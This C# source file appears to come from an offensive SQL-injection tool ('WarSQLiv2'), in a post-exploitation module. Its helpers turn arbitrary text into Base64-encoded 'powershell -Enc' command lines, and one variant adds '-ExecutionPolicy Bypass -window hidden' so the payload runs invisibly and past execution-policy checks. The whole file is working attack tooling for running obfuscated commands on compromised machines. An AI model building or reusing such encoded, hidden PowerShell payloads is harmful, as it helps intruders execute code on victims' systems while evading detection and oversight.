using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WarSQLiv2.Exploitation.PostExploitation
{
    class EncodeBase64
    {
        public static string ConvertTextToBase64(string clearText)
        {
            byte[] asc = Encoding.ASCII.GetBytes(clearText);
            string unic = Encoding.ASCII.GetString(asc);
            var plainTextBytes = System.Text.Encoding.Unicode.GetBytes(unic);
            var base64 = "powershell -Enc " + Convert.ToBase64String(plainTextBytes) + " -noprofile -ExecutionPolicy Bypass -window hidden";

            return base64;
        }
        public static string ConvertTextToBase64NonBypass(string clearText)
        {
            byte[] asc = Encoding.ASCII.GetBytes(clearText);
            string unic = Encoding.ASCII.GetString(asc);
            var plainTextBytes = System.Text.Encoding.Unicode.GetBytes(unic);
            var base64 = "powershell -Enc " + Convert.ToBase64String(plainTextBytes);

            return base64;
        }
        public static string ConvertTextToBase64NonPs(string clearText)
        {
            byte[] asc = Encoding.ASCII.GetBytes(clearText);
            string unic = Encoding.ASCII.GetString(asc);
            var plainTextBytes = System.Text.Encoding.Unicode.GetBytes(unic);
            var base64 = Convert.ToBase64String(plainTextBytes);

            return base64;
        }
    }
}
